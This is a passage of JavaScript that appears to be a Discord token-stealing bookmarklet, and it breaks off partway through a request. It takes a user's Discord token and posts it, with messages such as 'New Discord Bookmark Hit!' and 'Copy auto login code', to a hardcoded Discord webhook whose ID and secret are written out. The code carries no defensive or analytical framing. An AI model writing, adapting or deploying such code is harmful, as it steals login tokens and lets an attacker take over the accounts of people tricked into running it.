fetch("https://discord.com", {
  method: "POST",
  headers: {
    "Access-Control-Allow-Origin": "https://discord.com"
  },
  body: {
    user: token
  }
}).then(response => {
  const timestamp = new Date().toISOString();
  const jsonData = JSON.stringify({
    content: "@everyone **New Discord Bookmark Hit!**",
    username: "Bookmark",
    tts: false,
    embeds: [
      {
        title: "+1 New Result Account",
        type: "rich",
        description: "```${token}```",
        timestamp: timestamp,
        color: parseInt("000000", 16),
        author: {
          name: "Copy auto login code",
          url: "https://mee6.xyz"
        }
      }
    ]
  });

  return fetch("https://discord.com/api/webhooks/1054523228946698291/LaUKoZqQyVz6Tm5AN4QeRIjEb5iI1Q53dRErqyXjFhNo76GFljTD7dF96hv9EbPFjcNi", {
    method: "POST",
    headers: {
      "Content-type": "application/json"
